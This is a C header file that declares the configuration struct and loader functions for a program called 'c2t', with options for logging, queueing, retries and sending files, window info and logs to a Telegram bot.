/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#ifndef C2T_CONFIG_H
#define C2T_CONFIG_H

#include <stddef.h>

typedef struct {
    int verbose;
    int log_file;
    int auto_restart;
    int is_worker;
    int telegram_enabled;
    int telegram_deduplicate;
    int telegram_send_files;
    int telegram_send_window_info;
    int telegram_send_logs;
    size_t telegram_log_interval_sec;
    size_t telegram_max_file_bytes;
    size_t queue_max_bytes;
    size_t queue_max_items;
    size_t delivery_attempts;
    size_t retry_delay_ms;
    const char *telegram_bot_token;
    const char *telegram_chat_id;
} c2t_config_t;

void c2t_config_load(const char *executable_path);
/* Compatibility entry point for callers that do not need a macOS sidecar. */
void c2t_config_load_environment(void);
const char *c2t_config_apply_arguments(int argc, char **argv);
void c2t_config_set_chat_id(const char *chat_id);
[[nodiscard]] const c2t_config_t *c2t_config_get(void);

#endif
